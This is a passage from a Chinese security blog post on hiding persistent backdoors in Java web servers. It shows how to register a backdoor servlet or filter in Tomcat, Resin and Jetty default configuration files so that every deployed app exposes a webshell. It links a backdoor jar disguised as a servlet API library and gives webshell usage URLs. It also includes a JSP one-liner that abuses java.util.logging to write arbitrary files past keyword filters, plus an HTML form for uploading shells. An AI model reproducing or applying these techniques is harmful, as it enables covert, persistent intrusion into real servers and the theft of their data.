<p>￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image006.png" target="_blank" rel="external"><img title="clip_image006" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="301" alt="clip_image006" src="http://img.cker.in/JavaWeb8_9E52/clip_image006_thumb.png" width="1337" border="0"></a></p>

<h5>Resin修改conf/app-default.xml：</h5>

<p>￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image007.png" target="_blank" rel="external"><img title="clip_image007" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="232" alt="clip_image007" src="http://img.cker.in/JavaWeb8_9E52/clip_image007_thumb.png" width="1372" border="0"></a></p>

<h4>0x05 邪恶第二式-“变态的server永久后门”</h4>

<hr align="left" width="100%" noshade="noshade" size="2">

<p>如果说修改某些不起眼的配置文件达到隐藏后门足够有意思的话，那么直接把后门“藏到Server里面”可能更隐蔽。</p>

<p>在之前攻击Java系列教程中就已经比较详细的解释过Java的Server以及servlet和filter了。其实server启动跟启动一个app应用是非常相似的，我们需要做的仅仅是把servlet或者filter从应用层移动到server层，而且可以做到全局性。这种隐藏方法是极度残暴的，但是缺点是需要重启Server。假设在一台Server上部署了N个应用，访问任意一个应用都能获取Webshell。<a href="http://ip/xxx就是后门了。没明白？上demo。" target="_blank" rel="external">http://ip/xxx就是后门了。没明白？上demo。</a></p>

<h5>Tomcat5配置方式：</h5>

<p>在<code>apache-tomcat-5.5.27\conf\web.xml</code>的session-config后面加上一个filter或者servlet即可全局过滤：</p>

<pre><code>&#160;&#160;&#160; &lt;servlet&gt;</code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;HttpServletWrapper&lt;/servlet-name&gt;</code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;javax.servlet.web.http.HttpServletWrapper&lt;/servlet-class&gt;</code></pre>

<pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre>

<pre><code>&#160;</code></pre>

<pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;HttpServletWrapper&lt;/servlet-name&gt;</code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;/servlet/HttpServletWrapper&lt;/url-pattern&gt;</code></pre>

<pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre>

<p>url-pattern表示默认需要过滤的请求后缀。</p>

<p>需要把jar复制到tomcat的lib目录，项目启动的时候会自动加载jar的filter或者filter。 ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image008.png" target="_blank" rel="external"><img title="clip_image008" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="210" alt="clip_image008" src="http://img.cker.in/JavaWeb8_9E52/clip_image008_thumb.png" width="896" border="0"></a></p>

<p>Resin配置需要修改<code>E:\soft\resin-pro-3.1.13\conf\app-default.xml</code>，在resin-xtp的servler后面加上对应的filter或者servlet并把<code>E:\soft\resin-pro-3.1.13\lib</code>放入后门的jar包： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image009.png" target="_blank" rel="external"><img title="clip_image009" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="449" alt="clip_image009" src="http://img.cker.in/JavaWeb8_9E52/clip_image009_thumb.png" width="1339" border="0"></a></p>

<p>Jetty配置，修改<code>D:\Soft\Server\jetty-distribution-9.0.5.v20130815\etc\webdefault.xml</code>文件，在default的servlet之前配置上面的filter和servler配置。</p>

<p>Jar包：<code>E:\soft\jetty-distribution-9.0.4.v20130625\lib</code></p>

<p>其他的Server就不列举了差不多。servlet和filter配置也都大同小异知道其中的一种就知道另一种怎么配置了。</p>

<p>servlet-api-3.04.jar是我伪装的一个后门， jar下载地址：<a href="http://pan.baidu.com/s/17mKbH" target="_blank" rel="external">http://pan.baidu.com/s/17mKbH</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image011.png" target="_blank" rel="external"><img title="clip_image011" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image011" src="http://img.cker.in/JavaWeb8_9E52/clip_image011_thumb.png" width="193" border="0"></a></p>

<p>对应的后门HttpServletWrapper.java下载地址：<a href="http://pan.baidu.com/s/1l8eiM" target="_blank" rel="external">http://pan.baidu.com/s/1l8eiM</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image013.png" target="_blank" rel="external"><img title="clip_image013" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image013" src="http://img.cker.in/JavaWeb8_9E52/clip_image013_thumb.png" width="193" border="0"></a></p>

<h4>0x06 其他后门</h4>

<hr align="left" width="100%" noshade="noshade" size="2">

<h5>1、javabean</h5>

<p><a href="http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar" target="_blank" rel="external">http://blogimg.chinaunix.net/blog/upfile2/090713181535.rar</a></p>

<p>用法：把beans.jsp传到网站根目录，把beans.class传到&quot;\webapp\WEB-INF\classes\linx&quot;目录。</p>

<p>再访问</p>

<p><a href="http://xxxxxx.com/webapp/beans.jsp?c=ls" target="_blank" rel="external">http://xxxxxx.com/webapp/beans.jsp?c=ls</a></p>

<h5>2、servlet</h5>

<p><a href="http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar" target="_blank" rel="external">http://blogimg.chinaunix.net/blog/upfile2/090713181617.rar</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image015.png" target="_blank" rel="external"><img title="clip_image015" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image015" src="http://img.cker.in/JavaWeb8_9E52/clip_image015_thumb.png" width="131" border="0"></a></p>

<p>用法：把文件传到&quot;\webapp\WEB-INF\classes&quot;目录，访问</p>

<p><a href="http://xxxxxx.com/webapp/servlet/servlets?c=ls" target="_blank" rel="external">http://xxxxxx.com/webapp/servlet/servlets?c=ls</a></p>

<p>如果无法打开，请参考</p>

<p><a href="http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx" target="_blank" rel="external">http://blog.csdn.net/larmy888/archive/2006/03/02/613920.aspx</a></p>

<p><b><a href="http://blog.csdn.net/larmy888/article/details/613920" target="_blank" rel="external">开启servlet调试器,在不修改web.xml文件的情况下也能运行servlet </a></b><b></b></p>

<p>具体做法如下，在tomcat的根目录下，比如我的安转目录是D:/Apache Software Foundation/Tomcat 5.5找到conf文件夹下的web.xml文件.把其中如下的servlet和servlet-mapping元素注释去掉:<br>  <br>&lt;servlet&gt;<br><br>  <br>&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br><br>  <br>&lt;servlet-class&gt;<br><br>  <br>org.apache.catalina.servlets.InvokerServlet<br><br>  <br>&lt;/servlet-class&gt;<br><br>  <br>…<br><br>  <br>&lt;/servlet&gt;<br><br>  <br>…<br><br>  <br>&lt;servlet-mapping&gt;<br><br>  <br>&lt;servlet-name&gt;invoker&lt;/servlet-name&gt;<br><br>  <br>&lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;<br><br>  <br>&lt;/servlet-mapping&gt;</p>

<p>随着学习的深入，你会体会到这样带来的便利性，但不建议企业服务器这么做，仅限于学习阶段。</p>

<p>测试servlet. 写好HelloServlet.java并编译.把HelloServlet.class拷贝至 tomcat主目录/webapps/ROOT/WEB-INF/classes(一般需要自己建一个classes文件夹)下,在浏览器地址栏输入<a href="http://localhost:port/servlet/HelloServlet" target="_blank" rel="external">http://localhost:port/servlet/HelloServlet</a> (这里可以看到开启servlet调试器的便利之处).</p>

<h5>3、编译执行型后门</h5>

<p>上传一个java文件编译并执行，通过socket方式可做后门。一般来说Server的loader在启动后不会再去加载新增的jar或者class文件，如果想自动加载新的class文件可能需要根据不同的Server去改配置。Tomcat下配置的时候经常有人会reloadable=&quot;true&quot;这样就有机会动态去加载class文件。可以根据Server去留一些有意思的后门。</p>

<p><a href="http://xsser.me/caidao/getshell-by-logger.txt" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.txt</a> <a href="http://img.cker.in/JavaWeb8_9E52/clip_image017.png" target="_blank" rel="external"><img title="clip_image017" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="69" alt="clip_image017" src="http://img.cker.in/JavaWeb8_9E52/clip_image017_thumb.png" width="186" border="0"></a></p>

<p>某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new File这样的方式去写文件，甚至是尽可能的不要出现File关键字。</p>

<p>看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。</p>

<p>java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。</p>

<p>新建2.jsp并访问：</p>

<p>&lt;%java.util.logging.Logger l=java.util.logging.Logger.getLogger(&quot;t&quot;);java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter(&quot;t&quot;));%&gt;</p>

<p>访问菜刀shell正常输出: </p>

<p>新生成的jsp文件在Server不重启情况下貌似无法直接删除，xxx.jsp.lck，锁了</p>

<p>其实重点还是写文件，整理下上面的格式：</p>

<p>&lt;% </p>

<p>java.util.logging.Logger l = java.util.logging.Logger.getLogger(&quot;t&quot;); </p>

<p>java.util.logging.FileHandler h = new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+ request.getParameter(&quot;f&quot;), true); </p>

<p>h.setFormatter(new java.util.logging.SimpleFormatter()); </p>

<p>l.addHandler(h); </p>

<p>l.info(request.getParameter(&quot;t&quot;)); </p>

<p>%&gt;</p>

<p>其他略特殊点的文件读写Demo：</p>

<p>new FileOutputStream </p>

<p>new FileOutputStream(&quot;d:/sb.txt&quot;).write(new String(&quot;123&quot;).getBytes()); </p>

<p>new DataOutputStream </p>

<p>new DataOutputStream(new FileOutputStream(&quot;d:/1x.txt&quot;)).write(new String(&quot;123&quot;).getBytes()); </p>

<p>FileWriter fw = new FileWriter(&quot;d:/3.txt&quot;); </p>

<p>fw.write(&quot;21&quot;); </p>

<p>fw.flush(); </p>

<p>fw.close(); </p>

<p>RandomAccessFile rf = new RandomAccessFile(&quot;d:/14.txt&quot;, &quot;rw&quot;); </p>

<p>rf.write(new String(&quot;3b&quot;).getBytes()); </p>

<p>rf.close();</p>

<p>GetShell.htm:</p>

<p>&lt;html&gt; </p>

<p>&lt;head&gt; </p>

<p>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; </p>

<p>&lt;title&gt;jsp-yzmm&lt;/title&gt; </p>

<p>&lt;/head&gt; </p>

<p>&lt;style&gt; </p>

<p>.main{width:980px;height:600px;margin:0 auto;} </p>

<p>.url{width:300px;} </p>

<p>.fn{width:80px;} </p>

<p>.content{width:80%;height:60%;} </p>

<p>&lt;/style&gt; </p>

<p>&lt;script&gt; </p>

<p>function upload(){ </p>

<p>var url = document.getElementById(‘url’).value, </p>

<p>content = document.getElementById(‘content’).value, </p>

<p>fileName = document.getElementById(‘fn’).value, </p>

<p>form = document.getElementById(‘fm’); </p>

<p>if(url.length == 0){ </p>

<p>alert(&quot;Url not allowd empty!&quot;); </p>

<p>return ; </p>

<p>} </p>

<p>if(content.length == 0){ </p>

<p>alert(&quot;Content not allowd empty!&quot;); </p>

<p>return ; </p>

<p>} </p>

<p>if(fileName.length == 0){ </p>

<p>alert(&quot;FileName not allowd empty!&quot;); </p>

<p>return ; </p>

<p>} </p>

<p>form.action = url; </p>

<p>form.submit(); </p>

<p>} </p>

<p>&lt;/script&gt; </p>

<p>&lt;body&gt; </p>

<p>&lt;div class=&quot;main&quot;&gt; </p>

<p>&lt;form id=&quot;fm&quot; method=&quot;post&quot;&gt;</p>

<p>URL:&lt;input type=&quot;text&quot; value=&quot;<a href="http://localhost/Struts2/css3.jsp&amp;quot" target="_blank" rel="external">http://localhost/Struts2/css3.jsp&amp;quot</a>; class=&quot;url&quot; id=&quot;url&quot; /&gt;&amp;nbsp;&amp;nbsp; </p>

<p>FileName:&lt;input type=&quot;text&quot; name=&quot;f&quot; value=&quot;css.jsp&quot; class=&quot;fn&quot; id=&quot;fn&quot; /&gt;&amp;nbsp;&amp;nbsp; </p>

<p>&lt;a href=&quot;javascript:upload();&quot;&gt;Upload&lt;/a&gt;&lt;br/&gt; </p>

<p>&lt;textarea id=&quot;content&quot; class=&quot;content&quot; name=&quot;t&quot; &gt;&lt;/textarea&gt; </p>

<p>&lt;/form&gt; </p>

<p>&lt;/div&gt; </p>

<p>&lt;/body&gt; </p>

<p>&lt;/html&gt;</p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://www.cker.in/1043.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://www.cker.in/1043.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cker.in/1043.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.cker.in/1043.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/1044.seo/">
        ← http-only型cookie截取及利用
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/946.seo/">
        友情检测张柏芝官方网站全过程 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
